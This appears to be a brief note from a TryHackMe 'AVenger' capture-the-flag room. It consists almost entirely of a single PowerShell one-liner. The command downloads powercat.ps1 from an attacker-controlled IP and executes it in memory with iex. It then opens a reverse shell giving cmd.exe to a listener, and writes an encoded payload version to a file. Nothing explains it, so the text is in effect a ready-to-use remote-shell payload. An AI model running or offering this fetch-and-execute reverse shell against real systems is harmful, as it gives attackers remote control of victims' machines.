# TryHackMe-AVenger

LHOST=<LocalHostIP>
LPORT=<Listener_port>

pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('http://10.6.116.252/powercat.ps1'); powercat -c $LHOST -p $LPORT -e cmd.exe -ge" > /home/gkhn/Documents/$shell
